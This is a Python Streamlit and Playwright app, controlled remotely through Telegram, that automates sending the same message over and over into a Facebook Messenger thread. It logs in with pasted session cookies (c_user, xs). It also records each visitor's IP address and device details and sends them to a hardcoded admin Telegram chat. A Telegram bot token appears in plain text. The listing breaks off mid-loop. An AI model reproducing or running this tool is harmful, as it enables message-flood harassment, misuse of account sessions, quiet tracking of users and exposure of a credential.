
import streamlit as st
import json
import asyncio
import os
import time
import threading
import requests
import gc
import psutil
import hashlib
import random
import string
import socket
import platform
from datetime import datetime
from playwright.async_api import async_playwright
from telegram.ext import Application, CommandHandler, ContextTypes
import sqlite3
from pathlib import Path

# ============== ANURAG MISHRA BRANDING ==============
APP_NAME = "Anurag Mishra Bot Controller"
APP_VERSION = "v6.0 PRO"
ADMIN_NAME = "Anurag Mishra"
# ===========================================

# ============== CONFIGURATION ==============
TELEGRAM_BOT_TOKEN = "8567425809:AAE67VWXbpfHpWurWH6tMlN_pNLoTu6R60k"
TELEGRAM_ADMIN_ID = "8567425809"

MAX_MEMORY_PERCENT = 75
CRITICAL_MEMORY = 85
MAX_LOGS = 50
RESTART_COOLDOWN = 30
AUTO_PING_INTERVAL = 180
# ===========================================

# ============== DATABASE SETUP ==============
def init_db():
    conn = sqlite3.connect('anurag_bot.db')
    c = conn.cursor()
    
    # Servers table
    c.execute('''CREATE TABLE IF NOT EXISTS servers (
                    id TEXT PRIMARY KEY,
                    user_id TEXT,
                    user_name TEXT,
                    user_ip TEXT,
                    user_device TEXT,
                    login_time TEXT,
                    last_active TEXT,
                    group_name TEXT,
                    thread_id TEXT,
                    status TEXT,
                    messages_sent INTEGER DEFAULT 0,
                    ram_usage REAL,
                    session_count INTEGER DEFAULT 1
                )''')
    
    # Logins table - NEW
    c.execute('''CREATE TABLE IF NOT EXISTS logins (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    server_id TEXT,
                    user_id TEXT,
                    user_name TEXT,
                    ip_address TEXT,
                    device_info TEXT,
                    browser TEXT,
                    login_time TEXT,
                    location TEXT
                )''')
    
    # Users table
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    id TEXT PRIMARY KEY,
                    name TEXT,
                    first_seen TEXT,
                    last_seen TEXT,
                    total_logins INTEGER DEFAULT 0,
                    total_messages INTEGER DEFAULT 0,
                    servers_count INTEGER DEFAULT 0
                )''')
    
    conn.commit()
    conn.close()

init_db()

# ============== GET SYSTEM INFO ==============
def get_system_info():
    """Get device and network info"""
    try:
        hostname = socket.gethostname()
        ip_address = requests.get('https://api.ipify.org?format=json', timeout=5).json().get('ip', 'Unknown')
    except:
        ip_address = 'Unknown'
    
    return {
        'ip': ip_address,
        'device': platform.system() + " " + platform.release(),
        'machine': platform.machine(),
        'processor': platform.processor()[:30] if platform.processor() else 'Unknown'
    }

# ============== SERVER IDENTIFICATION ==============
def get_server_id():
    if 'server_id' not in st.session_state:
        base = str(time.time()) + str(random.randint(1000, 9999))
        st.session_state.server_id = "AM-" + hashlib.md5(base.encode()).hexdigest()[:8].upper()
    return st.session_state.server_id

SERVER_ID = get_server_id()
USER_ID = st.session_state.get('user_id', 'USER-' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)))

# Get system info
SYS_INFO = get_system_info()

# ============== PAGE CONFIG ==============
st.set_page_config(
    page_title=f"{APP_NAME} | {SERVER_ID}",
    page_icon="🤖",
    layout="wide",
    initial_sidebar_state="expanded"
)

# ============== PROFESSIONAL CSS ==============
st.markdown(f"""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;900&display=swap');
    
    * {{ font-family: 'Poppins', sans-serif; }}
    
    .main {{ 
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
        color: #ffffff;
    }}
    
    .login-flash {{
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,255,136,0.1);
        z-index: 9999;
        animation: flash 0.5s ease-out;
        pointer-events: none;
    }}
    
    @keyframes flash {{
        0% {{ opacity: 1; }}
        100% {{ opacity: 0; }}
    }}
    
    .anurag-header {{
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        padding: 30px;
        border-radius: 25px;
        margin-bottom: 20px;
        box-shadow: 0 25px 60px rgba(240, 147, 251, 0.4);
        text-align: center;
        position: relative;
        overflow: hidden;
    }}
    
    .anurag-title {{
        font-size: 3rem;
        font-weight: 900;
        color: white;
        text-shadow: 0 0 30px rgba(255,255,255,0.5);
        margin: 0;
    }}
    
    .server-badge {{
        display: inline-block;
        background: rgba(255,255,255,0.2);
        padding: 8px 20px;
        border-radius: 50px;
        margin-top: 15px;
        font-weight: 600;
        backdrop-filter: blur(10px);
    }}
    
    .anurag-card {{
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(20px);
        border-radius: 20px;
        padding: 25px;
        border: 1px solid rgba(255,255,255,0.2);
        margin-bottom: 20px;
    }}
    
    .metric-box {{
        text-align: center;
        padding: 20px;
    }}
    
    .metric-value {{
        font-size: 3rem;
        font-weight: 800;
        background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }}
    
    .status-pill {{
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 10px 20px;
        border-radius: 50px;
        font-weight: 700;
    }}
    
    .status-online {{
        background: linear-gradient(135deg, #11998e, #38ef7d);
        color: #000;
    }}
    
    .status-offline {{
        background: linear-gradient(135deg, #ff416c, #ff4b2b);
        color: white;
    }}
    
    .pulse-dot {{
        width: 10px;
        height: 10px;
        border-radius: 50%;
        background: currentColor;
        animation: pulse 1s infinite;
    }}
    
    @keyframes pulse {{
        0%, 100% {{ opacity: 1; transform: scale(1); }}
        50% {{ opacity: 0.5; transform: scale(1.2); }}
    }}
    
    .log-entry {{
        padding: 12px;
        margin: 8px 0;
        border-radius: 12px;
        font-family: 'Courier New', monospace;
        font-size: 12px;
        border-left: 4px solid;
        animation: slideIn 0.3s ease;
    }}
    
    .log-login {{ background: rgba(0, 255, 136, 0.2); border-color: #00ff88; color: #00ff88; }}
    .log-success {{ background: rgba(0, 184, 148, 0.2); border-color: #00b894; color: #00cec9; }}
    .log-error {{ background: rgba(214, 48, 49, 0.2); border-color: #ff7675; color: #ff7675; }}
    .log-warning {{ background: rgba(253, 203, 110, 0.2); border-color: #fdcb6e; color: #fdcb6e; }}
    .log-info {{ background: rgba(116, 185, 255, 0.2); border-color: #74b9ff; color: #74b9ff; }}
    
    .telegram-float {{
        position: fixed;
        bottom: 30px;
        right: 30px;
        background: linear-gradient(135deg, #0088cc, #00a8e8);
        color: white;
        padding: 15px 25px;
        border-radius: 50px;
        font-weight: 700;
        box-shadow: 0 10px 30px rgba(0, 136, 204, 0.4);
        z-index: 9999;
    }}
    
    .new-login-banner {{
        background: linear-gradient(135deg, #00b894, #00cec9);
        color: #000;
        padding: 15px;
        border-radius: 15px;
        text-align: center;
        font-weight: 700;
        margin-bottom: 20px;
        animation: slideDown 0.5s ease;
    }}
    
    @keyframes slideDown {{
        from {{ transform: translateY(-100%); opacity: 0; }}
        to {{ transform: translateY(0); opacity: 1; }}
    }}
    </style>
""", unsafe_allow_html=True)

# ============== TELEGRAM MANAGER ==============
class AnuragTelegramManager:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = str(admin_id)
        self.app = None
        self.enabled = True
        self.last_alert = 0
        self.alert_cooldown = 20
        
    async def init(self):
        try:
            self.app = Application.builder().token(self.token).build()
            
            self.app.add_handler(CommandHandler("start", self.cmd_start))
            self.app.add_handler(CommandHandler("servers", self.cmd_servers))
            self.app.add_handler(CommandHandler("logins", self.cmd_logins))
            self.app.add_handler(CommandHandler("users", self.cmd_users))
            self.app.add_handler(CommandHandler("status", self.cmd_status))
            self.app.add_handler(CommandHandler("startbot", self.cmd_start_bot))
            self.app.add_handler(CommandHandler("stopbot", self.cmd_stop_bot))
            self.app.add_handler(CommandHandler("restart", self.cmd_restart))
            self.app.add_handler(CommandHandler("globals", self.cmd_global_stats))
            self.app.add_handler(CommandHandler("help", self.cmd_help))
            
            await self.app.initialize()
            await self.app.start()
            await self.app.updater.start_polling(drop_pending_updates=True)
            
            return True
        except Exception as e:
            print(f"Telegram init error: {e}")
            return False
    
    def is_admin(self, update):
        return str(update.effective_chat.id) == self.admin_id
    
    async def cmd_start(self, update, context):
        if not self.is_admin(update):
            await update.message.reply_text("⛔ *Unauthorized!*", parse_mode='Markdown')
            return
        await update.message.reply_text(f"✅ *Welcome {ADMIN_NAME}!*\n\nUse /help for commands", parse_mode='Markdown')
    
    async def cmd_logins(self, update, context):
        if not self.is_admin(update):
            return
        conn = sqlite3.connect('anurag_bot.db')
        c = conn.cursor()
        c.execute("SELECT * FROM logins ORDER BY login_time DESC LIMIT 10")
        logins = c.fetchall()
        conn.close()
        
        if not logins:
            await update.message.reply_text("📭 *No login records*", parse_mode='Markdown')
            return
        
        text = "🔑 *RECENT LOGINS*\n\n"
        for login in logins:
            _, sid, uid, uname, ip, device, browser, time, loc = login
            text += f"👤 `{uname}`\n🆔 `{sid}`\n📍 IP: `{ip}`\n💻 `{device}`\n🕐 `{time}`\n\n"
        
        await update.message.reply_text(text, parse_mode='Markdown')
    
    async def cmd_servers(self, update, context):
        if not self.is_admin(update):
            return
        conn = sqlite3.connect('anurag_bot.db')
        c = conn.cursor()
        c.execute("SELECT id, user_name, group_name, status, messages_sent, ram_usage FROM servers ORDER BY last_active DESC")
        servers = c.fetchall()
        conn.close()
        
        text = "🖥️ *ACTIVE SERVERS*\n\n"
        for s in servers[:10]:
            sid, uname, gname, status, msgs, ram = s
            emoji = "🟢" if status == "RUNNING" else "🔴"
            text += f"{emoji} `{sid}` | 👤 {uname}\n📱 {gname} | 💬 {msgs}\n\n"
        
        await update.message.reply_text(text, parse_mode='Markdown')
    
    async def cmd_users(self, update, context):
        if not self.is_admin(update):
            return
        conn = sqlite3.connect('anurag_bot.db')
        c = conn.cursor()
        c.execute("SELECT name, total_logins, total_messages FROM users ORDER BY total_logins DESC")
        users = c.fetchall()
        conn.close()
        
        text = "👥 *USER ACTIVITY*\n\n"
        for u in users[:10]:
            name, logins, msgs = u
            text += f"👤 *{name}*\n🔑 {logins} logins | 💬 {msgs} msgs\n\n"
        
        await update.message.reply_text(text, parse_mode='Markdown')
    
    async def cmd_status(self, update, context):
        if not self.is_admin(update):
            return
        mem = psutil.virtual_memory()
        status = "🟢 RUNNING" if st.session_state.get('bot_running') else "🔴 STOPPED"
        
        await update.message.reply_text(f"""
📊 *{SERVER_ID} STATUS*

{status}
👤 User: `{st.session_state.get('user_name', 'Unknown')}`
💾 RAM: `{mem.percent}%`
🔄 Restarts: `{st.session_state.get('restart_count', 0)}`
💬 Messages: `{st.session_state.get('message_count', 0)}`
📱 Group: `{st.session_state.get('group_name', 'Not set')}`
        """, parse_mode='Markdown')
    
    async def cmd_start_bot(self, update, context):
        if not self.is_admin(update):
            return
        st.session_state.tg_command = "START"
        await update.message.reply_text(f"🚀 *Starting {SERVER_ID}...*", parse_mode='Markdown')
    
    async def cmd_stop_bot(self, update, context):
        if not self.is_admin(update):
            return
        st.session_state.tg_command = "STOP"
        await update.message.reply_text(f"🛑 *Stopping {SERVER_ID}...*", parse_mode='Markdown')
    
    async def cmd_restart(self, update, context):
        if not self.is_admin(update):
            return
        st.session_state.tg_command = "RESTART"
        await update.message.reply_text(f"🔄 *Restarting {SERVER_ID}...*", parse_mode='Markdown')
    
    async def cmd_global_stats(self, update, context):
        if not self.is_admin(update):
            return
        conn = sqlite3.connect('anurag_bot.db')
        c = conn.cursor()
        c.execute("SELECT COUNT(*), SUM(total_logins), SUM(total_messages) FROM users")
        total_users, total_logins, total_msgs = c.fetchone()
        c.execute("SELECT COUNT(*) FROM servers WHERE status='RUNNING'")
        active_servers = c.fetchone()[0]
        conn.close()
        
        await update.message.reply_text(f"""
🌍 *GLOBAL STATISTICS - {ADMIN_NAME}*

👥 Total Users: `{total_users or 0}`
🔑 Total Logins: `{total_logins or 0}`
💬 Total Messages: `{total_msgs or 0}`
🖥️ Active Servers: `{active_servers or 0}`
📊 Total Servers: `{total_users or 0}`

✨ *Bot Network Active*
        """, parse_mode='Markdown')
    
    async def cmd_help(self, update, context):
        if not self.is_admin(update):
            return
        await update.message.reply_text(f"""
🤖 *{APP_NAME} - Admin Commands*

/logins - Recent login activity
/servers - All active servers
/users - All users activity
/status - Current server
/startbot - Start this server
/stopbot - Stop this server  
/restart - Restart this server
/globals - Global statistics
/help - This help

⚡ *{ADMIN_NAME}'s Control Center*
        """, parse_mode='Markdown')
    
    async def send_to_admin(self, text, msg_type="info"):
        if not self.enabled or not self.app:
            return
        
        now = time.time()
        if msg_type not in ["system", "login", "critical", "cookie"] and now - self.last_alert < self.alert_cooldown:
            return
        self.last_alert = now
        
        full_text = f"🤖 *{APP_NAME}*\n\n{text}\n\n⏰ `{datetime.now().strftime('%H:%M:%S')}`"
        
        try:
            await self.app.bot.send_message(
                chat_id=self.admin_id,
                text=full_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            print(f"Telegram send error: {e}")
    
    async def send_login_alert(self, user_name, user_id, ip, device, server_id):
        """Send login notification to admin"""
        await self.send_to_admin(f"""
🔔 *NEW LOGIN ALERT*

👤 User: `{user_name}`
🆔 ID: `{user_id}`
🖥️ Server: `{server_id}`
📍 IP: `{ip}`
💻 Device: `{device}`
🕐 Time: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`

✅ Panel Accessed
        """, "login")

# ============== MEMORY MANAGER ==============
class AnuragMemoryManager:
    def __init__(self):
        self.process = psutil.Process()
        self.last_restart = 0
        
    def get_ram(self):
        return psutil.virtual_memory().percent
    
    def cleanup(self):
        if 'logs' in st.session_state and len(st.session_state.logs) > MAX_LOGS:
            st.session_state.logs = st.session_state.logs[:MAX_LOGS]
        
        keep = ['bot_running', 'logs', 'memory_mgr', 'telegram_mgr', 'user_id', 'server_id',
                'restart_count', 'cleanup_count', 'message_count', 'group_name', 'thread_id',
                'last_health_check', 'tg_command', 'user_name', 'login_time', 'ip_address',
                'device_info', 'login_notified']
        for key in list(st.session_state.keys()):
            if key not in keep and not key.startswith('_'):
                del st.session_state[key]
        
        gc.collect()
        gc.collect()
        st.session_state.cleanup_count = st.session_state.get('cleanup_count', 0) + 1
        return self.get_ram()
    
    def need_restart(self):
        ram = self.get_ram()
        now = time.time()
        if ram > CRITICAL_MEMORY and now - self.last_restart > RESTART_COOLDOWN:
            self.last_restart = now
            return True
        return False

# ============== DATABASE FUNCTIONS ==============
def record_login(user_name, user_id, ip, device):
    """Record login in database"""
    conn = sqlite3.connect('anurag_bot.db')
    c = conn.cursor()
    
    # Record login
    c.execute("""INSERT INTO logins 
                 (server_id, user_id, user_name, ip_address, device_info, browser, login_time, location)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
              (SERVER_ID, user_id, user_name, ip, device, "Streamlit", 
               datetime.now().isoformat(), "Unknown"))
    
    # Update or insert user
    c.execute("""INSERT INTO users (id, name, first_seen, last_seen, total_logins)
                 VALUES (?, ?, ?, ?, 1)
                 ON CONFLICT(id) DO UPDATE SET
                 last_seen = ?,
                 total_logins = total_logins + 1""",
              (user_id, user_name, datetime.now().isoformat(), 
               datetime.now().isoformat(), datetime.now().isoformat()))
    
    # Update server
    c.execute("""INSERT OR REPLACE INTO servers 
                 (id, user_id, user_name, user_ip, user_device, login_time, last_active, status)
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
              (SERVER_ID, user_id, user_name, ip, device, 
               datetime.now().isoformat(), datetime.now().isoformat(), "ONLINE"))
    
    conn.commit()
    conn.close()

def update_server_status(status, group_name="", thread_id=""):
    conn = sqlite3.connect('anurag_bot.db')
    c = conn.cursor()
    c.execute("""UPDATE servers SET status = ?, group_name = ?, thread_id = ?, 
                 last_active = ?, messages_sent = ?, ram_usage = ? WHERE id = ?""",
              (status, group_name, thread_id, datetime.now().isoformat(),
               st.session_state.get('message_count', 0),
               psutil.virtual_memory().percent, SERVER_ID))
    conn.commit()
    conn.close()

# ============== INIT SESSION ==============
if 'memory_mgr' not in st.session_state:
    st.session_state.memory_mgr = AnuragMemoryManager()
    st.session_state.telegram_mgr = AnuragTelegramManager(TELEGRAM_BOT_TOKEN, TELEGRAM_ADMIN_ID)
    st.session_state.logs = []
    st.session_state.bot_running = False
    st.session_state.restart_count = 0
    st.session_state.cleanup_count = 0
    st.session_state.message_count = 0
    st.session_state.last_health_check = time.time()
    st.session_state.tg_command = None
    st.session_state.login_notified = False
    st.session_state.user_name = ""
    st.session_state.ip_address = SYS_INFO['ip']
    st.session_state.device_info = SYS_INFO['device']
    st.session_state.login_time = datetime.now()

mm = st.session_state.memory_mgr
tg = st.session_state.telegram_mgr

def log(msg, level="INFO"):
    t = datetime.now().strftime("%H:%M:%S")
    colors = {"LOGIN": "🔑", "INFO": "ℹ️", "SUCCESS": "✅", "WARNING": "⚠️", "ERROR": "❌"}
    emoji = colors.get(level, "⬜")
    entry = f"{emoji} [{t}] {level}: {msg}"
    st.session_state.logs.insert(0, entry)
    if len(st.session_state.logs) > MAX_LOGS:
        st.session_state.logs.pop()

# ============== LOGIN NOTIFICATION ==============
def handle_login():
    """Handle new login and send notification"""
    if not st.session_state.get('login_notified', False):
        user_name = st.session_state.get('user_name', 'Unknown')
        
        # Record in DB
        record_login(user_name, USER_ID, SYS_INFO['ip'], SYS_INFO['device'])
        
        # Send to Telegram
        try:
            asyncio.run(tg.send_login_alert(
                user_name, 
                USER_ID, 
                SYS_INFO['ip'], 
                SYS_INFO['device'],
                SERVER_ID
            ))
            log(f"Login notification sent for {user_name}", "LOGIN")
        except Exception as e:
            log(f"Failed to send login alert: {e}", "ERROR")
        
        st.session_state.login_notified = True
        return True
    return False

# ============== FILE HELPERS ==============
def save(f, c):
    with open(f, 'w', encoding='utf-8') as file:
        file.write(c)

def read(f):
    try:
        if os.path.exists(f):
            with open(f, 'r', encoding='utf-8') as file:
                return file.read().strip()
    except:
        pass
    return ""

def parse_cookies(s):
    cookies = []
    for p in s.split(';'):
        if '=' in p:
            try:
                n, v = p.strip().split('=', 1)
                cookies.append({'name': n.strip(), 'value': v.strip(), 'domain': '.facebook.com', 'path': '/'})
            except:
                continue
    return cookies

# ============== AUTO PING ==============
def auto_ping():
    while True:
        try:
            update_server_status("RUNNING" if st.session_state.get('bot_running') else "IDLE",
                               st.session_state.get('group_name', ''),
                               st.session_state.get('thread_id', ''))
            
            if mm.need_restart():
                st.session_state.trigger_restart = True
            
            time.sleep(AUTO_PING_INTERVAL)
        except:
            time.sleep(60)

if 'ping_started' not in st.session_state:
    threading.Thread(target=auto_ping, daemon=True).start()
    st.session_state.ping_started = True

# ============== BOT LOGIC ==============
async def anurag_bot(url, msg, delay, group_name):
    st.session_state.bot_running = True
    st.session_state.group_name = group_name
    attempt = 0
    
    update_server_status("RUNNING", group_name, url.split('/')[-1])
    
    await tg.send_to_admin(f"""
🚀 *BOT STARTED*

👤 {st.session_state.get('user_name', 'Unknown')}
📱 {group_name}
🆔 {SERVER_ID}
⏱️ {delay}s delay
    """, "start")
    
    while attempt < 100 and st.session_state.get('bot_running', False):
        browser = None
        try:
            log(f"Attempt #{attempt + 1}")
            
            if mm.get_ram() > MAX_MEMORY_PERCENT:
                mm.cleanup()
            
            async with async_playwright() as p:
                browser = await p.chromium.launch(
                    headless=True,
                    executable_path="/usr/bin/chromium",
                    args=['--no-sandbox', '--disable-gpu', '--single-process', '--no-zygote', '--disable-images']
                )
                
                ctx = await browser.new_context(viewport={'width': 1280, 'height': 720})
                
                if os.path.exists('cookies.json'):
                    with open('cookies.json', 'r') as f:
                        c = json.load(f)
                        essential = [x for x in c if x.get('name') in ['c_user', 'xs']]
                        await ctx.add_cookies(essential[:2])
                
                page = await ctx.new_page()
                await page.goto(url, timeout=90000, wait_until="domcontentloaded")
                await asyncio.sleep(10)
                
                if "login" in page.url:
                    await tg.send_to_admin(f"❌ Login failed - {group_name}", "ERROR")
                    break
                
                if attempt == 0:
                    await tg.send_to_admin(f"✅ Connected to {group_name}", "SUCCESS")
                
                sent = 0
                last_clean = time.time()
                last_status = time.time()
                
                while st.session_state.get('bot_running', False):
                    cmd = st.session_state.get('tg_command')
                    if cmd == "STOP":
                        st.session_state.tg_command = None
                        st.session_state.bot_running = False
                        await tg.send_to_admin(f"🛑 Stopped - {group_name}", "INFO")
                        break
                    
                    if cmd == "RESTART":
                        st.session_state.tg_command = None
                        raise Exception("Restart")
                    
                    if time.time() - last_clean > 30:
                        ram = mm.get_ram()
                        if ram > CRITICAL_MEMORY:
                            await tg.send_to_admin(f"🔥 Critical {ram}% - {group_name}", "ERROR")
                            raise MemoryError("Critical")
                        elif ram > MAX_MEMORY_PERCENT:
                            mm.cleanup()
                            await page.close()
                            page = await ctx.new_page()
                            await page.goto(url, timeout=30000)
                        last_clean = time.time()
                    
                    if time.time() - last_status > 3600:
                        await tg.send_to_admin(f"⏰ Hourly: {sent} msgs in {group_name}", "INFO")
                        last_status = time.time()
                    
                    try:
                        box = await page.wait_for_selector('div[contenteditable="true"]', timeout=5000)
                        if box:
                            await box.fill(msg)
                            await page.keyboard.press('Enter')
                            sent += 1
                            st.session_state.message_count = sent
                            update_server_status("RUNNING", group_name, url.split('/')[-1])
                            
                            if sent % 25 == 0:
                                await tg.send_to_admin(f"📨 {group_name}: {sent} msgs", "SUCCESS")
                            
                            await asyncio.sleep(delay)
                    except Exception as e:
                        log(f"Send error: {str(e)[:30]}", "WARNING")
                        await asyncio.sleep(3)
                
                await browser.close()
                await tg.send_to_admin(f"✅ Stopped - {group_name}\nTotal: {sent}", "SUCCESS")
                break
                
        except MemoryError:
            attempt += 1
            if browser:
                try: await browser.close()
                except: pass
            mm.cleanup()
            gc.collect()
            await tg.send_to_admin(f"💀 Crash #{attempt} - {group_name}", "ERROR")
            await asyncio.sleep(10)
            
        except Exception as e:
            attempt += 1
            err = str(e)
            log(f"Error: {err[:60]}", "ERROR")
            if browser:
                try: await browser.close()
                except: pass
            if attempt % 5 == 0:
                await tg.send_to_admin(f"⚠️ Error #{attempt} - {group_name}", "ERROR")
            await asyncio.sleep(5)
    
    st.session_state.bot_running = False
    update_server_status("STOPPED", group_name, url.split('/')[-1])

# ============== PROCESS COMMANDS ==============
def process_tg():
    cmd = st.session_state.get('tg_command')
    if not cmd:
        return
    
    if cmd == "START" and not st.session_state.bot_running:
        st.session_state.tg_command = None
        t, m, s, g = read('thread.txt'), read('message.txt'), read('speed.txt'), read('group.txt')
        if all([t, m, s, g]):
            url = f"https://www.facebook.com/messages/t/{t}"
            threading.Thread(target=lambda: asyncio.run(anurag_bot(url, m, float(s), g)), daemon=True).start()
            st.session_state.bot_running = True
            st.rerun()
    
    elif cmd == "STOP" and st.session_state.bot_running:
        st.session_state.tg_command = None
        st.session_state.bot_running = False
        st.rerun()
    
    elif cmd == "RESTART":
        st.session_state.tg_command = None
        st.session_state.restart_count += 1
        st.session_state.bot_running = False
        st.rerun()

# ============== START TELEGRAM ==============
if 'tg_started' not in st.session_state:
    def start_tg():
        asyncio.run(tg.init())
    threading.Thread(target=start_tg, daemon=True).start()
    st.session_state.tg_started = True

# ============== UI STARTS HERE ==============

# HANDLE LOGIN FIRST
is_new_login = handle_login()

# Show login flash effect
if is_new_login:
    st.markdown('<div class="login-flash"></div>', unsafe_allow_html=True)
    st.markdown(f"""
        <div class="new-login-banner">
            🔑 Welcome {st.session_state.get('user_name', 'User')}! Login notification sent to {ADMIN_NAME}
        </div>
    """, unsafe_allow_html=True)

# Floating Telegram
st.markdown(f'<div class="telegram-float">📱 Telegram Active</div>', unsafe_allow_html=True)

# Header
st.markdown(f"""
    <div class="anurag-header">
        <h1 class="anurag-title">🤖 {APP_NAME}</h1>
        <p class="anurag-subtitle">Created by {ADMIN_NAME} • Professional Bot Controller</p>
        <span class="server-badge">🆔 {SERVER_ID} | 👤 {USER_ID}</span>
    </div>
""", unsafe_allow_html=True)

process_tg()

# User Panel
st.markdown('<div class="anurag-card">', unsafe_allow_html=True)
col1, col2, col3 = st.columns([1, 2, 1])

with col1:
    initial = st.session_state.get('user_name', 'A')[:1].upper() if st.session_state.get('user_name') else "👤"
    st.markdown(f'<div style="width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg, #fa709a, #fee140);display:flex;align-items:center;justify-content:center;font-size:2rem;font-weight:800;color:white;margin:0 auto;">{initial}</div>', unsafe_allow_html=True)

with col2:
    user_name = st.text_input("Your Name", value=st.session_state.get('user_name', ''), 
                              placeholder="Enter your name", key="user_name_input")
    if user_name and user_name != st.session_state.get('user_name'):
        st.session_state.user_name = user_name
        # Re-send login with new name
        st.session_state.login_notified = False
        handle_login()
        st.rerun()

with col3:
    ram = mm.get_ram()
    color = "#00b894" if ram < MAX_MEMORY_PERCENT else "#fdcb6e" if ram < CRITICAL_MEMORY else "#d63031"
    st.markdown(f"""
        <div style="text-align:center;padding:15px;background:rgba(0,0,0,0.3);border-radius:15px;">
            <div style="font-size:2.5rem;font-weight:800;color:{color};">{ram:.0f}%</div>
            <div style="font-size:0.9rem;color:#888;">RAM Usage</div>
        </div>
    """, unsafe_allow_html=True)

st.markdown('</div>', unsafe_allow_html=True)

# System Info
with st.expander("💻 Your System Info"):
    st.markdown(f"""
    | Property | Value |
    |----------|-------|
    | **Server ID** | `{SERVER_ID}` |
    | **User ID** | `{USER_ID}` |
    | **IP Address** | `{SYS_INFO['ip']}` |
    | **Device** | `{SYS_INFO['device']}` |
    | **Machine** | `{SYS_INFO['machine']}` |
    | **Login Time** | `{st.session_state.get('login_time', datetime.now()).strftime('%Y-%m-%d %H:%M:%S')}` |
    """)

# Metrics
st.markdown('<div class="anurag-card"><div style="display:grid;grid-template-columns:repeat(4,1fr);gap:20px;">', unsafe_allow_html=True)
cols = st.columns(4)
metrics = [
    (st.session_state.restart_count, "RESTARTS", "#ff6b6b"),
    (st.session_state.cleanup_count, "CLEANUPS", "#4ecdc4"),
    (st.session_state.message_count, "MESSAGES", "#ffe66d"),
    (len([l for l in st.session_state.logs if "LOGIN" in l]), "LOGINS", "#a8e6cf")
]
for col, (val, label, color) in zip(cols, metrics):
    with col:
        st.markdown(f'<div class="metric-box"><div class="metric-value" style="background:linear-gradient(135deg,{color},#fff);-webkit-background-clip:text;">{val}</div><div class="metric-label">{label}</div></div>', unsafe_allow_html=True)
st.markdown('</div></div>', unsafe_allow_html=True)

# Status & Controls
running = st.session_state.bot_running
group_name = st.session_state.get('group_name', '')

st.markdown('<div class="anurag-card">', unsafe_allow_html=True)

status_class = "status-online" if running else "status-offline"
status_text = "ONLINE" if running else "OFFLINE"

st.markdown(f"""
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
        <div class="status-pill {status_class}"><span class="pulse-dot"></span>{status_text}</div>
        <div style="text-align:right;"><div style="font-size:1.5rem;font-weight:700;">{group_name or 'No Group'}</div><div style="font-size:0.9rem;color:#888;">Target Group</div></div>
    </div>
""", unsafe_allow_html=True)

c1, c2, c3, c4 = st.columns(4)
with c1:
    if st.button("🚀 START", disabled=running, use_container_width=True):
        t, m, s, g = read('thread.txt'), read('message.txt'), read('speed.txt'), read('group.txt')
        if all([t, m, s, g]):
            url = f"https://www.facebook.com/messages/t/{t}"
            threading.Thread(target=lambda: asyncio.run(anurag_bot(url, m, float(s), g)), daemon=True).start()
            st.session_state.bot_running = True
            st.rerun()
        else:
            st.error("Fill all fields!")

with c2:
    if st.button("🛑 STOP", disabled=not running, use_container_width=True):
        st.session_state.bot_running = False
        st.rerun()

with c3:
    if st.button("🔄 RESTART", use_container_width=True):
        st.session_state.restart_count += 1
        st.session_state.bot_running = False
        st.rerun()

with c4:
    if st.button("🧹 CLEAN", use_container_width=True):
        before = mm.get_ram()
        mm.cleanup()
        after = mm.get_ram()
        log(f"Cleaned: {before:.1f}% → {after:.1f}%", "SUCCESS")
        st.success(f"RAM: {before:.1f}% → {after:.1f}%")

st.markdown('</div>', unsafe_allow_html=True)

# Configuration
with st.expander("⚙️ CONFIGURATION", expanded=not running):
    st.markdown('<div class="anurag-card">', unsafe_allow_html=True)
    
    with st.form("config"):
        c1, c2 = st.columns(2)
        with c1:
            group = st.text_input("📱 Group Name", value=read('group.txt'))
            thread = st.text_input("🆔 Thread ID", value=read('thread.txt'))
        with c2:
            speed = st.number_input("⏱️ Delay", value=float(read('speed.txt') or 5.0), min_value=1.0)
            st.text_input("🔐 Token", value=TELEGRAM_BOT_TOKEN[:15]+"...", disabled=True, type="password")
        
        msg_file = st.file_uploader("📄 Message File", type=['txt'])
        cookies = st.text_area("🍪 Cookies", value=read('cookies_raw.txt'), height=100)
        
        if st.form_submit_button("💾 SAVE", use_container_width=True):
            if group: 
                save('group.txt', group)
                st.session_state.group_name = group
            if thread: save('thread.txt', thread)
            if speed: save('speed.txt', str(speed))
            if msg_file: save('message.txt', msg_file.read().decode('utf-8'))
            if cookies:
                save('cookies_raw.txt', cookies)
                try:
                    cj = json.loads(cookies) if cookies.strip().startswith('[') else parse_cookies(cookies)
                    with open('cookies.json', 'w') as f:
                        json.dump(cj, f)
                    st.success("Saved!")
                except: pass
            st.balloons()
    
    st.markdown('</div>', unsafe_allow_html=True)

# Telegram Commands
with st.expander("📱 TELEGRAM COMMANDS"):
    st.markdown(f"""
    | Command | Description |
    |---------|-------------|
    | `/logins` | 🔑 Recent login activity |
    | `/servers` | 🖥️ All servers |
    | `/users` | 👥 All users |
    | `/status` | 📊 This server |
    | `/startbot` | 🚀 Start |
    | `/stopbot` | 🛑 Stop |
    | `/restart` | 🔄 Restart |
    | `/globals` | 🌍 Global stats |
    | `/help` | ❓ Help |
    
    **Admin:** `{ADMIN_NAME}` | **You:** `{USER_ID}`
    """)

# Logs
st.markdown('<div class="anurag-card">', unsafe_allow_html=True)
st.subheader("📋 Activity Logs")

st.markdown('<div class="log-container">', unsafe_allow_html=True)
if not st.session_state.logs:
    st.info("No activity yet")
else:
    for log in st.session_state.logs[:20]:
        if "LOGIN" in log:
            log_class = "log-login"
